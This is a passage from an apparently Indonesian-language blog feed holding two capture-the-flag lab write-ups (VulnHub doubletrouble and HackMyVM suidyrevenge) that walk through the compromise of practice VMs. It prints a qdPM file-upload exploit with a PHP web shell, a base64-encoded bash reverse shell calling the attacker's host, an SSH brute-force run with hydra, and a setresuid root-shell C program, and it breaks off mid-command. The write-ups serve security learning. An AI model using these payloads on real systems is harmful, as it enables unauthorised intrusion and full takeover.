                <span class="n">dateStampNew</span> <span class="o">=</span> <span class="n">line</span><span class="p">[</span><span class="n">line</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="n">start</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span><span class="p">:</span><span class="n">line</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="n">end</span><span class="p">)]</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">dateStampNew</span> <span class="o">&gt;</span> <span class="n">dateStamp</span><span class="p">):</span>
                    <span class="n">dateStamp</span> <span class="o">=</span> <span class="n">dateStampNew</span>
                    <span class="k">print</span><span class="p">(</span><span class="s">"The DateStamp is "</span> <span class="o">+</span> <span class="n">dateStamp</span><span class="p">)</span>
                    <span class="n">backdoorFile</span> <span class="o">=</span> <span class="n">line</span><span class="p">[</span><span class="n">line</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="s">"href"</span><span class="p">)</span><span class="o">+</span><span class="mi">6</span><span class="p">:</span><span class="n">line</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="s">"php"</span><span class="p">)</span><span class="o">+</span><span class="mi">3</span><span class="p">]</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"Exception occurred"</span><span class="p">)</span>
                <span class="k">continue</span>
        <span class="c1">#print(backdoor)
</span>    <span class="k">print</span><span class="p">(</span><span class="s">'Backdoor uploaded at - &gt; '</span> <span class="o">+</span> <span class="n">HOSTNAME</span> <span class="o">+</span> <span class="s">'uploads/users/'</span> <span class="o">+</span> <span class="n">backdoorFile</span> <span class="o">+</span> <span class="s">'?cmd=whoami'</span><span class="p">)</span>
</code></pre></div></div>
<p>dalam variable <code class="language-plaintext highlighter-rouge">url</code> sudah dipastikan bahwa POST request akan dikirimkan ke <code class="language-plaintext highlighter-rouge">/index.php/login</code> dengan banyak <code class="language-plaintext highlighter-rouge">payload</code> untuk autentikasi seperti password dan username.</p>

<blockquote>
  <p>berarti saya harus mendapatkan credentialsnya terlebih dahulu</p>
</blockquote>

<p>lalu, kalau sudah mendapatkan <code class="language-plaintext highlighter-rouge">credentials</code> akan dilanjutkan untuk mengirim <code class="language-plaintext highlighter-rouge">session requests</code>. karena saya ingin mencoba manual untuk memahami konsep kode tersebut berjalan (bukan karena tidak tahu cara memakai automasi) dengan sempurna sampai ke titik variable <code class="language-plaintext highlighter-rouge">get_file</code> yang merujuk pada url <code class="language-plaintext highlighter-rouge">/index.php/myAccount</code> untuk melakukan injeksi seperti variable <code class="language-plaintext highlighter-rouge">backdoor</code> jelaskan. dalam fungsi <code class="language-plaintext highlighter-rouge">req</code> dengan beberapa parameternya yaitu <code class="language-plaintext highlighter-rouge">userid</code>, <code class="language-plaintext highlighter-rouge">username</code>, <code class="language-plaintext highlighter-rouge">csrftoken_</code>, <code class="language-plaintext highlighter-rouge">EMAIL</code> dan <code class="language-plaintext highlighter-rouge">HOSTNAME</code> ada hal menarik yang perlu dilihat.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">req</span><span class="p">(</span><span class="n">userid</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">csrftoken_</span><span class="p">,</span> <span class="n">EMAIL</span><span class="p">,</span> <span class="n">HOSTNAME</span><span class="p">):</span>
    <span class="n">request_1</span> <span class="o">=</span> <span class="n">multifrm</span><span class="p">(</span><span class="n">userid</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">csrftoken_</span><span class="p">,</span> <span class="n">EMAIL</span><span class="p">,</span> <span class="n">HOSTNAME</span><span class="p">,</span> <span class="s">'.htaccess'</span><span class="p">)</span>
    <span class="n">new</span> <span class="o">=</span> <span class="n">session_requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">HOSTNAME</span> <span class="o">+</span> <span class="s">'index.php/myAccount/update'</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">request_1</span><span class="p">)</span>
    <span class="n">request_2</span> <span class="o">=</span> <span class="n">multifrm</span><span class="p">(</span><span class="n">userid</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">csrftoken_</span><span class="p">,</span> <span class="n">EMAIL</span><span class="p">,</span> <span class="n">HOSTNAME</span><span class="p">,</span> <span class="s">'../.htaccess'</span><span class="p">)</span>
    <span class="n">new1</span> <span class="o">=</span> <span class="n">session_requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">HOSTNAME</span> <span class="o">+</span> <span class="s">'index.php/myAccount/update'</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">request_2</span><span class="p">)</span>
    <span class="n">request_3</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">'sf_method'</span><span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="s">'put'</span><span class="p">),</span>
        <span class="s">'users[id]'</span><span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">userid</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span>
        <span class="s">'users[photo_preview]'</span><span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="s">''</span><span class="p">),</span>
        <span class="s">'users[_csrf_token]'</span><span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">csrftoken_</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span>
        <span class="s">'users[name]'</span><span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">username</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span>
        <span class="s">'users[new_password]'</span><span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="s">''</span><span class="p">),</span>
        <span class="s">'users[email]'</span><span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">EMAIL</span><span class="p">),</span>
        <span class="s">'extra_fields[9]'</span><span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="s">''</span><span class="p">),</span>
        <span class="s">'users[photo]'</span><span class="p">:</span> <span class="p">(</span><span class="s">'backdoor.php'</span><span class="p">,</span> <span class="s">'&lt;?php if(isset($_REQUEST[</span><span class="se">\'</span><span class="s">cmd</span><span class="se">\'</span><span class="s">])){ echo "&lt;pre&gt;"; $cmd = ($_REQUEST[</span><span class="se">\'</span><span class="s">cmd</span><span class="se">\'</span><span class="s">]); system($cmd); echo "&lt;/pre&gt;"; die; }?&gt;'</span><span class="p">,</span> <span class="s">'application/octet-stream'</span><span class="p">),</span>
        <span class="p">}</span>
    <span class="n">upload_req</span> <span class="o">=</span> <span class="n">session_requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">HOSTNAME</span> <span class="o">+</span> <span class="s">'index.php/myAccount/update'</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">request_3</span><span class="p">)</span>
</code></pre></div></div>
<p>dalam array <code class="language-plaintext highlighter-rouge">request_3</code> ada <code class="language-plaintext highlighter-rouge">users[photo]</code> yang akan mengirimkan request dengan format php yang berisikan <code class="language-plaintext highlighter-rouge">RCE</code> untuk disalahgunakan. dengan begitu bisa disimpulkan dalam variable <code class="language-plaintext highlighter-rouge">upload_req</code> akan mengirimkan arguments <code class="language-plaintext highlighter-rouge">files</code> yaitu <code class="language-plaintext highlighter-rouge">requests_3</code> ke <code class="language-plaintext highlighter-rouge">/index.php/myAccount/update</code> lalu RCE akan terbentuk.</p>

<p>Dengan begitu,</p>

<p>saya tahu apa yang harus saya lakukan dalam mesin ini. Letâ€™s get digging into the hacking phase!</p>
<h2 id="directory-brute-force">Directory Brute-force</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [vh/doubletrouble]
â•°â”€î˜‚ cat gobuster 
/uploads              (Status: 301) [Size: 316] [--&gt; http://192.168.56.29/uploads/]
/css                  (Status: 301) [Size: 312] [--&gt; http://192.168.56.29/css/]
/template             (Status: 301) [Size: 317] [--&gt; http://192.168.56.29/template/]
/images               (Status: 301) [Size: 315] [--&gt; http://192.168.56.29/images/]
/js                   (Status: 301) [Size: 311] [--&gt; http://192.168.56.29/js/]
/sf                   (Status: 301) [Size: 311] [--&gt; http://192.168.56.29/sf/]
/core                 (Status: 301) [Size: 313] [--&gt; http://192.168.56.29/core/]
/install              (Status: 301) [Size: 316] [--&gt; http://192.168.56.29/install/]
/secret               (Status: 301) [Size: 315] [--&gt; http://192.168.56.29/secret/]
/backups              (Status: 301) [Size: 316] [--&gt; http://192.168.56.29/backups/]
/batch                (Status: 301) [Size: 314] [--&gt; http://192.168.56.29/batch/]
/server-status        (Status: 403) [Size: 278]
</code></pre></div></div>
<p>dalam directory <code class="language-plaintext highlighter-rouge">/install</code> ada hal menarik yang ingin saya jelaskan, di dalam directory tersebut ada <code class="language-plaintext highlighter-rouge">connection shock</code> yang bisa saya simpulkan kalau revshell ga perlu untuk susah payah haha.</p>

<p><img src="https://i.postimg.cc/WpXzxq9B/image.png" alt="images" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [vh/doubletrouble]
â•°â”€î˜‚ ncat -nvlp 1337
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 192.168.56.29.
Ncat: Connection from 192.168.56.29:47330.
</code></pre></div></div>

<h2 id="whatweb-results">Whatweb results</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [vh/doubletrouble]
â•°â”€î˜‚ cat whatweb_scan 
http://192.168.56.29 [200 OK] Apache[2.4.38], Bootstrap, Cookies[qdPM8], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.56.29], JQuery[1.10.2], PasswordField[login[password]], Script[text/javascript], Title[qdPM | Login], X-UA-Compatible[IE=edge]
</code></pre></div></div>
<p>Ya, sepertinya semua di sini sudah ditampilkan oleh nmap.</p>

<h2 id="nikto-results">Nikto results</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [vh/doubletrouble]
â•°â”€î˜‚ nikto -host $victim | tee nikto_scan 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.29
+ Target Hostname:    192.168.56.29
+ Target Port:        80
+ Start Time:         2022-11-16 13:50:02 (GMT7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie qdPM8 created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x1a 0x4b402c6422300 
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.1.1/images/".
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3092: /install/: This might be interesting...
+ OSVDB-3092: /readme.txt: This might be interesting...
+ OSVDB-3268: /secret/: Directory indexing found.
</code></pre></div></div>
<p>seperti yang sudah ditampilkan oleh <code class="language-plaintext highlighter-rouge">gobuster</code>, di dalam directory <code class="language-plaintext highlighter-rouge">/secret</code> terdapat sebuah image berformat <code class="language-plaintext highlighter-rouge">jpg</code>.</p>

<p><img src="https://i.postimg.cc/D0PXN7j7/image.png" alt="images2" /></p>

<p>awalnya penasaran dan takut apakah nanti ada tingkat kesulitan lagi untuk menganalisis gambar ini? hadeh.</p>

<h2 id="image-extraction">image extraction</h2>

<p>karena dalam directory <code class="language-plaintext highlighter-rouge">secret</code> ada semacam image berformat <code class="language-plaintext highlighter-rouge">jpg</code> maka saya mencoba untuk mendownloadnya dan mencari isi file tersebut.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [vh/doubletrouble]
â•°â”€î˜‚ wget http://$victim/secret/doubletrouble.jpg                                           
--2022-11-17 11:23:55--  http://192.168.56.29/secret/doubletrouble.jpg
Connecting to 192.168.56.29:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 82779 (81K) [image/jpeg]
Saving to: â€˜doubletrouble.jpg.1â€™

doubletrouble.jpg.1                                     100%[==============================================================================================================================&gt;]  80.84K  --.-KB/s    in 0.004s  

2022-11-17 11:23:55 (17.8 MB/s) - â€˜doubletrouble.jpgâ€™ saved [82779/82779]
â•­â”€ via [vh/doubletrouble]
â•°â”€î˜‚ file *jpg                                          
doubletrouble.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 501x450, components 3
â•­â”€ via [vh/doubletrouble]
â•°â”€î˜‚ binwalk *jpg                    

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
â•­â”€ via [vh/doubletrouble]
â•°â”€î˜‚ stegseek -xf -sf *jpg -wl ~/Desktop/rockyou.txt                                                       1 â†µ
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "92camaro"         
[i] Original filename: "creds.txt".
[i] Extracting to "-sf".
</code></pre></div></div>
<p>Well, bahkan ada original filename.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [vh/doubletrouble]
â•°â”€î˜‚ mv ./-sf creds.txt      
â•­â”€ via [vh/doubletrouble]
â•°â”€î˜‚ cat creds.txt         
otisrush@localhost.com
otis666%
</code></pre></div></div>

<h2 id="shell-as-www-data">shell as www-data</h2>
<p>seperti yang sudah dijelaskan pada subbab <code class="language-plaintext highlighter-rouge">exploit analyzing</code> bahwasanya <code class="language-plaintext highlighter-rouge">qdPM 9.1</code> bisa dipasangi revshell pada <code class="language-plaintext highlighter-rouge">/index.php/myAccount</code> bagian list Photo karena ada <code class="language-plaintext highlighter-rouge">file attachment</code>. saya mencoba memasang RCE berformat <code class="language-plaintext highlighter-rouge">phtml</code>.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [vh/doubletrouble]
â•°â”€î˜‚ cat *phtml   
&lt;?php system($_GET['c']); ?&gt;
</code></pre></div></div>
<p>ketika saya upload, dan saya pergi ke <code class="language-plaintext highlighter-rouge">/uploads/users/</code> untuk mencari backdoor yang saya pasang.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [vh/doubletrouble]
â•°â”€î˜‚ curl -s 'http://192.168.56.29/uploads/users/970086-lmfao.phtml?c=id'                                                     
uid=33(www-data) gid=33(www-data) groups=33(www-data)
â•­â”€ via [vh/doubletrouble]
â•°â”€î˜‚ echo "/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.1/12345 0&gt;&amp;1" | base64                                                                                                                                              
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMS8xMjM0NSAwPiYxCg==
â•­â”€ via [vh/doubletrouble]
â•°â”€î˜‚ curl -s 'http://192.168.56.29/uploads/users/970086-lmfao.phtml?c=echo+L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMS8xMjM0NSAwPiYxCg==+|+base64+-d+|+bash'

--

â•­â”€ via [vh/doubletrouble]
â•°â”€î˜‚ ncat -nvlp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 192.168.56.29.
Ncat: Connection from 192.168.56.29:59362.
bash: cannot set terminal process group (467): Inappropriate ioctl for device
bash: no job control in this shell
www-data@doubletrouble:/var/www/html/uploads/users$
</code></pre></div></div>

<h2 id="shell-as-root">shell as root</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@doubletrouble:/var/www/html/uploads/users$ sudo /usr/bin/awk 'BEGIN{system("/bin/bash")}'
id
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div></div>]]></content><author><name></name></author><category term="vulnhub" /><category term="RCE" /><category term="awk" /><summary type="html"><![CDATA[Mesin dengan kategori easy dari sebuah open community yaitu VulnHub dengan menjalankan nmap lalu melihat eksploitasi yang tercantum dan mencoba menjalankan script yang menarik dari hasil pencarian searchsploit. ditambah, mencari credentials dari image jpg. dan login menggunakan credentials tersebut, memasang revshell dan masuk ke sistem lalu menjalankan sudo -l untuk abusing ke root.]]></summary></entry><entry><title type="html">HackMyVM: suidyrevenge</title><link href="http://localhost:4000/hmv-suidyrevenge" rel="alternate" type="text/html" title="HackMyVM: suidyrevenge" /><published>2022-11-05T00:00:00+07:00</published><updated>2022-11-05T00:00:00+07:00</updated><id>http://localhost:4000/hmv-suidyrevenge</id><content type="html" xml:base="http://localhost:4000/hmv-suidyrevenge"><![CDATA[<p>Hello, this is small things iâ€™ve been doing lately because of getting bored. kukira susah karena <em>difficulty</em>-nya. ya, cuma buka scan nmap terus crawling semua text, masuk ke hydra untuk bruteforce lalu dapet credentials-nya dan masuk lewat <code class="language-plaintext highlighter-rouge">ssh</code>. dan ya biasanya lagi, jalanin <code class="language-plaintext highlighter-rouge">linpeas</code> dan dapet suid binary yang sebelumnya ada <code class="language-plaintext highlighter-rouge">note.txt</code> tertulis kalo <code class="language-plaintext highlighter-rouge">root</code> bakal <em>autorun</em> sebuah script untuk ganti <em>owner</em> dan beri akses <em>suid</em> dan boom rooted.</p>

<h2 id="nmap-scanning">nmap scanning</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [machines/suidyrevenge]
â•°â”€î˜‚ cat scan_tcp         
# Nmap 7.92 scan initiated Fri Nov  4 23:17:33 2022 as: nmap -vvv -p 22,80 -sCV -A -oN scan_tcp 192.168.56.28
Nmap scan report for 192.168.56.28
Host is up, received syn-ack (0.00044s latency).
Scanned at 2022-11-04 23:17:41 WIB for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 99:04:21:6d:81:68:2e:d7:fe:5e:b2:2c:1c:a2:f5:3d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAG/AX+0fiqIOG/5Jb4HuzPcAIdWkKC9AY7R9eqeSvykjKD3T3cVL5rbWGz3vfkBBDqVAp6l6Fj3CGsS6h4jKrnObsoDxtfIMAgspLQF9b9KjMEcM0aLDQKusQI5H9C5/HMsC50qx7XZUeOoTDinNR4wFjBls2PcbY8IJoRtapRYxvkRHc4l+eSpZk8+NJ2Z0xGYljlCwketld9+9BZuKEBThRvms+5ZQ8AQntoG7mD2JgeIIHr5vxU62ECM5V1EWhAnW8KEI3otZKAOpU48p3r+pWpAeGJJapWAx8f+IPzDWpR7BwosImvRvUgXgqqvPwkqCL9t8HJrieWcIrm1a1
|   256 b2:4e:c2:91:2a:ba:eb:9c:b7:26:69:08:a2:de:f2:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGWoTM7aAsBYvrYZYL4vz9sEaD+Pf0pYs61DwxR0zyK8de0rg+OoAnDz217AhoO78rRAqAdrE6382xpHKcmrm8I=
|   256 66:4e:78:52:b1:2d:b6:9a:8b:56:2b:ca:e5:48:55:2d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII4uRBZ1dmmy2uld4YwTO9LQeMWjp7nsQLNZXsg+nBfl
80/tcp open  http    syn-ack nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  4 23:17:48 2022 -- 1 IP address (1 host up) scanned in 14.33 seconds
</code></pre></div></div>
<ul>
  <li><code class="language-plaintext highlighter-rouge">22/TCP open</code> with OpenSSH 7.9p1 Service as ssh that runs on Debian.</li>
  <li><code class="language-plaintext highlighter-rouge">80/TCP open</code> with Nginx 1.14.2 as HTTP.</li>
</ul>

<p>ketika saya cari lebih tentang exploit yang ada, ternyata semunya sudah <em>up-to-dated</em></p>

<p>-</p>

<h2 id="web-source-info">web source info</h2>
<p>kurang menarik bukan? mari lihat <code class="language-plaintext highlighter-rouge">web source</code>nya. (sebenarnya saya sudah buka full tampilan <em>frontend</em> tapi isinya cuma kaya gini, ya jadi saya kasih seperti di bawah :)).</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/suidyrevenge]
â•°â”€î˜‚ curl <span class="nt">-v</span> <span class="nv">$victim</span>
<span class="k">*</span>   Trying 192.168.56.28:80...
<span class="k">*</span> Connected to 192.168.56.28 <span class="o">(</span>192.168.56.28<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
<span class="o">&gt;</span> GET / HTTP/1.1
<span class="o">&gt;</span> Host: 192.168.56.28
<span class="o">&gt;</span> User-Agent: curl/7.86.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> 
<span class="k">*</span> Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Server: nginx/1.14.2
&lt; Date: Fri, 04 Nov 2022 18:14:00 GMT
&lt; Content-Type: text/html
&lt; Content-Length: 322
&lt; Last-Modified: Thu, 01 Oct 2020 18:11:16 GMT
&lt; Connection: keep-alive
&lt; ETag: <span class="s2">"5f761bc4-142"</span>
&lt; Accept-Ranges: bytes
&lt; 
Im proud to announce that <span class="s2">"theuser"</span> is not anymore <span class="k">in </span>our servers.
Our admin <span class="s2">"mudra"</span> is the best admin of the world.
<span class="nt">-suidy</span>

&lt;<span class="o">!</span><span class="nt">--</span>

<span class="s2">"mudra"</span> is not the best admin, IM IN!!!!
He only changed my password to a different but I had <span class="nb">time
</span>to put 2 backdoors <span class="o">(</span>.php<span class="o">)</span> from my KALI into /supersecure to keep the access!

<span class="nt">-theuser</span>

<span class="nt">--</span><span class="o">&gt;</span>
<span class="k">*</span> Connection <span class="c">#0 to host 192.168.56.28 left intact</span>
</code></pre></div></div>

<h2 id="dir-bruteforce">dir bruteforce</h2>
<p>saya coba directory bruteforce pada <code class="language-plaintext highlighter-rouge">/supersecure/</code> untuk mencari backdoor yang dimaksud.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [machines/suidyrevenge]
â•°â”€î˜‚ cat url_gobuster_2 
/simple-backdoor.php  (Status: 200) [Size: 28]
â•­â”€ via [machines/suidyrevenge]
â•°â”€î˜‚ curl -s $victim/supersecure/simple-backdoor.php
cmd parameter is my friend.
â•­â”€ via [machines/suidyrevenge]
â•°â”€î˜‚ curl -s "$victim/supersecure/simple-backdoor.php?cmd=id"                                                                  3 â†µ
cmd parameter is my friend.
&lt;pre&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/pre&gt;% 
</code></pre></div></div>

<h2 id="shell-ass-theuser">shell ass theuser</h2>
<p>karena kelamaan, saya sambi dengan scraping text yang ada pake <code class="language-plaintext highlighter-rouge">cewl</code> untuk ngetest aja apakah bisa dibruteforce atau tidak menggunakan <code class="language-plaintext highlighter-rouge">hydra</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/suidyrevenge]
â•°â”€î˜‚ cewl <span class="nv">$victim</span> <span class="o">&gt;</span> wordlists                                                                                                
â•­â”€ via <span class="o">[</span>machines/suidyrevenge]
â•°â”€î˜‚ <span class="nb">cat </span>wordlist                                                                                                            
the
admin
theuser
not
mudra
best
proud
announce
that
anymore
our
servers
Our
world
suidy
only
changed
password
different
but
had
<span class="nb">time
</span>put
backdoors
php
from
KALI
into
supersecure
keep
access
â•­â”€ via <span class="o">[</span>machines/suidyrevenge]
â•°â”€î˜‚ hydra <span class="nt">-L</span> wordlist <span class="nt">-P</span> wordlist <span class="nt">-f</span> <span class="nv">$victim</span> ssh <span class="nt">-s</span> <span class="nt">-V</span> <span class="nt">-I</span> <span class="nt">-t</span> 4
Hydra v9.4 <span class="o">(</span>c<span class="o">)</span> 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>

Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2022-11-05 01:54:49
<span class="o">[</span>WARNING] Restorefile <span class="o">(</span>ignored ...<span class="o">)</span> from a previous session found, to prevent overwriting, ./hydra.restore
<span class="o">[</span>DATA] max 4 tasks per 1 server, overall 4 tasks, 961 login tries <span class="o">(</span>l:31/p:31<span class="o">)</span>, ~241 tries per task
<span class="o">[</span>DATA] attacking ssh://192.168.56.28:22/
<span class="o">[</span>STATUS] 39.00 tries/min, 39 tries <span class="k">in </span>00:01h, 922 to <span class="k">do in </span>00:24h, 4 active
<span class="o">[</span>22][ssh] host: 192.168.56.28   login: theuser   password: different
<span class="o">[</span>STATUS] attack finished <span class="k">for </span>192.168.56.28 <span class="o">(</span>valid pair found<span class="o">)</span>
1 of 1 target successfully completed, 1 valid password found
Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2022-11-05 01:56:55
</code></pre></div></div>
<p>lalu saya login lewat ssh dan get the user flag.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [machines/suidyrevenge]
â•°â”€î˜‚ ssh theuser@$victim
theuser@192.168.56.28's password: 
Linux suidyrevenge 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Nov  4 13:34:47 2022 from 192.168.56.1
theuser@suidyrevenge:~$ ls
user.txt
theuser@suidyrevenge:~$
</code></pre></div></div>

<h2 id="privesc">privesc</h2>

<p>seperti biasa pencarian <em>SUID binary</em> karena nama mesinnya mengindikasikan.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>theuser@suidyrevenge:~$ find / -perm -4000 2&gt;/dev/null
/home/suidy/suidyyyyy
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/umount
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/mount
/usr/bin/violent
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/passwd
theuser@suidyrevenge:~$ /home/suidy/suidyyyyy 
suidy@suidyrevenge:~$
</code></pre></div></div>
<p>Well saya sudah cek <code class="language-plaintext highlighter-rouge">sudo -l</code> dan tetap tidak ada respon, ngecek <code class="language-plaintext highlighter-rouge">crontab</code> sama saja. lalu saya analisis <code class="language-plaintext highlighter-rouge">suidyyyyy</code>. tetap tidak ada yang menarik. lalu saya mencoba untuk ke <code class="language-plaintext highlighter-rouge">HOME</code> dari user <code class="language-plaintext highlighter-rouge">suidy</code> dan menemukan <code class="language-plaintext highlighter-rouge">note.txt</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I know that theuser is not here anymore but suidyyyyy is now more secure!
root runs the script as in the past that always gives SUID to suidyyyyy binary
but this time also check the size of the file.
WE DONT WANT MORE "theuser" HERE!.
WE ARE SECURE NOW.

-suidy
</code></pre></div></div>
<p>setelah itu, saya <em>just in case</em> dengan membuat <code class="language-plaintext highlighter-rouge">small script</code> yang terbuat dari bahasa C.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
        <span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash -p"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>lalu saya compile dan saya beri izin <code class="language-plaintext highlighter-rouge">executable</code> agar nanti bisa dieksekusi.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>suidy@suidyrevenge:/home/suidy# gcc exploit.c -o exploit.o
suidy@suidyrevenge:/home/suidy# mv exploit.o suidyyyyy
suidy@suidyrevenge:/home/suidy# chmod 4755 suidyyyyy
suidy@suidyrevenge:/home/suidy# ls -la | grep "suidyyyyy"
